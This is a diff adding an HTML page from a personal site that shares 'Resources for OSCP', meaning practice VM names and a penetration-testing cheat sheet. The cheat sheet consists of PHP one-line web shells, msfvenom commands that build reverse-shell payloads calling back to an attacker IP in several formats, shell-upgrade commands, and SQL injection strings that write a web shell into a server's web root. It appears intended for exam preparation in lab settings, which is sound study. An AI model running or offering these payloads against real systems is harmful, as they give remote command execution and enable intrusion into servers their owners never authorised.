@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>ekutumin</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body>
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html#Resources">Resources</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">Tools</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/about-bg.jpg')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="page-heading">
+                            <h1>Resources for OSCP</h1>
+                            <span class="subheading">This is what I used during my preparation for OSCP exam</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Main Content-->
+        <main class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <h1>Virtual machines for practise</h1>
+                        <ul>
+                            <li>Kioptrix: Level 1 (#1)</li>
+                            <li>FristiLeaks: 1.3</li>
+                            <li>Kioptrix: Level 1.1 (#2)</li>
+                            <li>Stapler: 1</li>
+                            <li>Kioptrix: Level 1.2 (#3)</li>
+                            <li>Kioptrix: Level 1.3 (#4)</li>
+                            <li>PwnLab: init</li>
+                            <li>Tr0ll: 1</li>
+                            <li>Tr0ll: 2</li>
+                            <li>Kioptrix: 2014</li>
+                            <li>Lord Of The Root: 1.0.1</li>
+                            <li>Stapler: 1</li>
+                            <li>Mr-Robot: 1</li>
+                            <li>HackLAB: Vulnix</li>
+                            <li>HackInOS</li>
+                            <li>VulnOS: 2</li>
+                            <li>SickOs: 1.2</li>
+                            <li>pWnOS: 2.0</li>
+                            <li>Temple of Doom</li> 
+                            <li>SolidState</li>
+                            <li>Vulnix</li>
+                            <li>Zico2</li>
+                            <li>Billu_b0x 2</li>
+                            <li>SkyTower</li>
+                            <li>WinterMute </li> 
+                        </ul>
+                        <h1>Shells</h1> <br>
+                            <h4>PHP</h4>
+                                <p style="font-size: medium;">
+                                &#60;?php system($_GET["cmd"]); ?&#62; <br>
+                                &#60;?php echo shell_exec($_GET["cmd"]); ?&#62; 
+                                </p>
+                        <h4>Reverse Shell </h4">
+                
+                            <p><a style="font-size: medium;" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse-Shell-Cheat-Sheet</a></p>
+                        
+                        <h4>Msfvenom</h4">
+                                <pre style="font-size: medium;">
+                                
+#Linux
+                
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+                                
+# PHP
+                
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+                                
+# ASP
+                
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f asp > shell.asp
+                                
+# WAR
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+                                
+# JSP
+                                
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+                                
+# Exe
+                                
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
+                                
+</pre>
+                
+                        <h4>Interactive TTY Shell</h4">
+                                <pre style="font-size: medium;">
+                                
+# python
+python -c 'import pty; pty.spawn("/bin/sh")'
+                                
+# Echo
+echo 'os.system('/bin/bash')'
+                                
+# sh
+/bin/sh -i
+                                
+# bash
+/bin/bash -i
+</pre> <br>
+                
+                        <h4>Shell From SQL Injection</h4">
+                            <pre style="font-size: medium;">
+                                
+# windows
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
+                                
+# linux
+?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
+                            </pre>
+                            <h1>More</h1>
+                            <p><a href="https://github.com/areyou1or0/OSCP">https://github.com/areyou1or0/OSCP</a></p>
+                            <p>Big Thanks to this beautiful girl named Busra!</p>
+                            <img src="assets/img/Bursa_Demir.jpeg" class="img-fluid" alt="...">
+                    </div>
+
+                    </div>
+                </div>
+            </div> 
+            <br>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <li class="list-inline-item">
+                                <a href="https://www.facebook.com/kutumin">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="https://github.com/kutumin">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
